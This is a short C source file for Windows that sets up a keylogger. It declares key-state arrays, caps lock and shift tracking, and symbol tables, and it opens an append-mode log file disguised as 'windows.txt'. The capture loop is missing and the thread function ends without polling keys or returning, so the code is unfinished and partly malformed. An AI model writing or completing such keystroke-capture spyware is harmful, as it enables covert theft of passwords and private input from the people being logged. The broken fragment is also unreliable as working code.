#include <windows.h>
#include <stdio.h>

FILE* kh;

void end(void){
    fclose(kh);
}

DWORD WINAPI logg(_In LPVOID lpParameter) {
    SHORT last_key_state[0xff] = {  0  };
    SHORT is_capslock = 0, is_numlock = 0;
    SHORT is_shift = 0;
    SHORT is_pressed = 0;
    unsigned char show_key = 0;
    unsigned char vkey = 0;

    const char* num_char = ")!@#$%^&*(";
    const char* chars_vn = "=,~./`";
    const char* chars_vs = ":<>_?=";
    const char* chars_vo = "[\\]\';";
    const char* chars_vb = "{|}\"";

    fopen_s(&kh, "windows.txt", "a");

    if(kh != 0){ // se arquivo for aberto com sucesso
        atexit(end);

    }




}